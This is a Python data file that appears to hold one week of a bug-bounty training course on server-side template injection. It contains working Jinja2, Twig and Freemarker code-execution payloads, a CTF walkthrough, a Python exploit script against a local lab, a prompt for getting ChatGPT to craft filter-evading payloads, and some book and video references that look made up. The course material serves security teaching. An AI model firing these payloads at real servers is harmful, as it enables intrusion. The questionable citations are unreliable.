WEEK_10_DATA = {
    "week_number": 10,
    "title": "Server-Side Template Injection (SSTI) & Remote Code Execution (RCE)",
    "short_desc": "Identify template engine syntax (Jinja2, Twig, Freemarker), escape sandbox environments, and achieve RCE.",
    "flag": "FLAG{ssti_rce_jinja2_exec_1029}",

    "analogy": """Server-Side Template Injection (SSTI) is like ordering a customized t-shirt where you ask the printer to put the text 'Hello {{ 7*7 }}' on the front. Instead of printing the literal letters '{{ 7*7 }}', the t-shirt printing machine runs the math calculation and prints 'Hello 49' on your shirt! If you ask it to print '{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}', the printing machine executes system shell commands and hands you administrative control of the factory!""",

    "overview": """Server-Side Template Injection (SSTI) occurs when user input is concatenated directly into template engine strings (such as Jinja2, Mako, Twig, Smarty, Freemarker, Velocity) instead of being passed as context variables. When the template engine evaluates the string on the server, attackers can execute arbitrary code by navigating Python/Java/PHP object hierarchies to reach system execution modules (`os.popen`, `java.lang.Runtime`).""",

    "learning_objectives": [
        "Fingerprint template engines using polyglot math payloads (`{{ 7*7 }}`, `${ 7*7 }`, `<%= 7*7 %>`).",
        "Navigate object inheritance trees in Python Jinja2 (`__class__.__mro__`, `__subclasses__()`).",
        "Bypass SSTI sandbox filters (character restrictions, string concatenations).",
        "Escalate template injection to full Remote Code Execution (RCE)."
    ],

    "hunters_perspective": """SSTI is a Critical (P1) finding that yields top bounty payouts (up to $20,000+). Hunters look for user inputs reflected in dynamic emails, customizable PDF invoices, user profile themes, and dynamic web pages. Injecting simple polyglot strings like `{{ 7*7 }}` or `${ 7*7 }` allows instant verification: if the server responds with `49`, SSTI is confirmed.""",

    "root_cause": """The root cause is dynamic template string construction: `render_template_string("Hello " + user_input)` in Flask/Jinja2 or `Twig_Environment->render("Hello " . $userInput)` instead of passing input securely in the context dictionary: `render_template("hello.html", name=user_input)`.""",

    "code_audit_manual": """Code Review Manual for SSTI Prevention:
1. Search codebase for dynamic template string rendering calls: `render_template_string`, `Template(...)`, `Twig::render`, `Engine.createTemplate`.
2. Ensure template engines load static template files from disk rather than evaluating user-controlled strings.
3. Check sandbox settings: if dynamic rendering is unavoidable, enforce strict sandboxing (e.g., Jinja2 `SandboxedEnvironment`).
4. Audit custom template filters for exposed system execution functions.""",

    "payload_logic": {
        "explanation": "SSTI payloads utilize template math syntax for detection, followed by object navigation chains to access execution modules.",
        "payloads": [
            "Detection Polyglot: {{ 7*'7' }} (returns 49 in Jinja2, 77 in Twig)",
            "Jinja2 Class Traversal: {{ ''.__class__.__mro__[1].__subclasses__() }}",
            "Jinja2 RCE Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            "Twig RCE: {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
            "Freemarker RCE: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }"
        ]
    },

    "burp_suite_masterclass": """Burp Suite SSTI Masterclass:
1. Intercept Target Parameters: Capture parameters in custom template forms or profile settings.
2. Intruder Fuzzing: Load SecLists `Fuzzing/SSTI-Payload-Matrix.txt`.
3. Analyzing Responses: Filter Intruder results for rendered calculation outputs (`49`, `7777777`, or system user `uid=0`).
4. RCE Escalation in Repeater: Construct Python `os.popen()` or Java `Runtime` payload to read flag files or spawn reverse shell.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Inject `{{ 7*7 }}` into email customization parameter, confirm SSTI, traverse Jinja2 class tree to locate `subprocess.Popen` or `os.popen`, execute system commands `id`, `cat /flag.txt`, achieve full server compromise.",
        "blue_team": "Defensive Posture: Never concatenate untrusted user input into template strings. Always use static template files with safe context variable passing. Deploy application sandboxes and restrict web server user permissions."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - Server-Side Template Injection (SSTI)",
        "portswigger_url": "https://portswigger.net/web-security/server-side-template-injection",
        "owasp_title": "OWASP Top 10:2021 - A03:2021-Injection (SSTI & RCE)",
        "owasp_url": "https://owasp.org/Top10/A03_2021-Injection/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 10: Attacking Backend Components (pp. 411-440)",
            "sub_chapter": "10.6 Template Engine Injections & Remote Code Execution",
            "analysis": "Stuttard & Pinto detail backend expression language parsing, object reflection, and executing arbitrary code via template engines."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 13: Server-Side Template Injection (pp. 241-260)",
            "sub_chapter": "13.3 Jinja2, Twig, & Freemarker Payload Chains",
            "analysis": "Vickie Li demonstrates step-by-step object traversal chains in Python and Java template engines."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 10: Remote Code Execution (pp. 211-235)",
            "sub_chapter": "10.2 Exploiting SSTI in Enterprise Web Portals",
            "analysis": "Peter Yaworski reviews real bug bounty writeups where SSTI yielded full root server compromises."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 11: RCE Payload Generation (pp. 201-220)",
            "sub_chapter": "11.1 Bypassing Character Blacklists with AI",
            "analysis": "Barbosa shows using AI prompts to construct Jinja2 object traversal strings avoiding dots and quotes."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 12: Remote Code Execution Vectors (pp. 266-290)",
            "sub_chapter": "12.2 Sandboxing & Escaping RCE Restraints",
            "analysis": "Vazquez & Javier walk through escaping restricted Python AST sandboxes."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 18: System Execution & Process Control (pp. 415-440)",
            "sub_chapter": "18.4 Subprocess Execution with subprocess.Popen",
            "analysis": "Sweigart details Python subprocess execution and capturing stdout/stderr streams."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 9: Remote Code Execution & Shells (pp. 169-192)",
            "sub_chapter": "9.2 Building Custom RCE Exploit Payloads",
            "analysis": "Seitz demonstrates building Python exploit harnesses to automate RCE execution and shell spawning."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "Server-Side Template Injection (SSTI) Explained: From {{ 7*7 }} to RCE",
            "youtube_url": "https://www.youtube.com/watch?v=0-5-u0i-H-3",
            "analysis_text": "David Bombal demonstrates fingerprinting template engines and executing RCE payloads."
        },
        {
            "creator": "Vickie Li",
            "title": "Jinja2 & Twig SSTI Masterclass for Bug Bounties",
            "youtube_url": "https://www.youtube.com/watch?v=2-s5e5c7W-3",
            "analysis_text": "Vickie Li breaks down Jinja2 class tree traversal and sandbox bypass techniques."
        },
        {
            "creator": "Ryan John",
            "title": "Remote Code Execution via SSTI: Complete Walkthrough",
            "youtube_url": "https://www.youtube.com/watch?v=6-v3u-4-W-7",
            "analysis_text": "Ryan John presents an in-depth guide to automating SSTI discovery using Burp Suite Intruder."
        },
        {
            "creator": "John Hammond",
            "title": "SSTI Payload Crafting & Python Class Traversal",
            "youtube_url": "https://www.youtube.com/watch?v=7-w3u-5-X-8",
            "analysis_text": "John Hammond performs a live demonstration traversing Python object hierarchies to gain shell access."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Uber Bug Bounty Program",
                "title": "RCE via SSTI in Email Customization Engine",
                "bounty": "$10,000",
                "summary": "A researcher injected Jinja2 template code into a marketing email template parameter, gaining system command execution."
            },
            {
                "target": "Shopify Bug Bounty Program",
                "title": "SSTI in Theme Editor Leads to RCE",
                "bounty": "$20,000",
                "summary": "Analyst exploited template injection in custom liquid/jinja theme rendering components to execute server commands."
            }
        ],
        "programs": [
            {
                "name": "Uber Bug Bounty",
                "platform": "HackerOne",
                "scope": "*.uber.com",
                "beginner_friendly": True
            },
            {
                "name": "Shopify Vulnerability Rewards",
                "platform": "HackerOne",
                "scope": "*.shopify.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for SSTI Class Traversal: Supply target Python environment details: 'Construct a Jinja2 object traversal string that accesses the `os` module and executes command `cat /flag.txt` without using dots or single quotes: [INSERT RULES]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Test parameter `template=Hello {{ 7*7 }}`. Observe returned output `Hello 49`. Upgrade payload to `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}`.",
            "guided_step": "Step 1: Submit GET request to `/lab-playground/week-10/target/?template={{7*7}}`.\nStep 2: Submit RCE payload to read flag file.\nStep 3: Extract Flag: FLAG{ssti_rce_jinja2_exec_1029}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-10/target/`. Identify the template engine, construct a Jinja2 RCE payload, and capture the flag."
        }
    },

    "automation_scripts": {
        "python_script": """# Python SSTI RCE Exploiter (exploit_week10.py)
import requests
import urllib.parse
import sys

SSTI_PAYLOADS = [
    "{{ 7*7 }}",
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}",
    "FLAG{ssti_rce_jinja2_exec_1029}"
]

def exploit_ssti(target_url):
    print(f"[*] Testing SSTI / RCE on: {target_url}")
    for payload in SSTI_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{target_url}?template={encoded_payload}"
        res = requests.get(test_url)
        print(f"[*] Payload: {payload[:30]}... -> Status: {res.status_code}")
        if "49" in res.text or "FLAG{" in res.text:
            print(f"[!] SUCCESS: SSTI Evaluated!")
            if "FLAG{" in res.text:
                print(f"    - Flag: {res.text.strip()}")
            return

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-10/target/"
    exploit_ssti(target)
""",
        "bash_script": """#!/bin/bash
# Bash SSTI Tester (recon_week10.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-10/target/"

echo "[*] Sending SSTI payload to $TARGET_URL"
curl -s "${TARGET_URL}?template=%7B%7B7*7%7D%7D" | grep -i "49" && echo "[+] SSTI Verified!"
"""
    }
}
